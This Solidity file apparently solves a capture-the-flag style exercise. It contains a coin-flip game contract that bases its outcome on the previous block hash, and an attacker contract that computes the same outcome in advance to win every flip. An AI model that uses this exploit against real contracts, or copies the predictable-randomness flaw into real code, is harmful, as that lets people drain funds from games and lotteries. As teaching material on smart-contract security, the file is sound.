
pragma solidity ^0.8.0;

contract CoinFlipCaller {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flipIt(address _coinFlipAddress) external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinflip = blockValue / FACTOR;
    bool side = coinflip == 1 ? true : false;
    CoinFlip coinFlipContract = CoinFlip(_coinFlipAddress);
    coinFlipContract.flip(side);
  }

}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
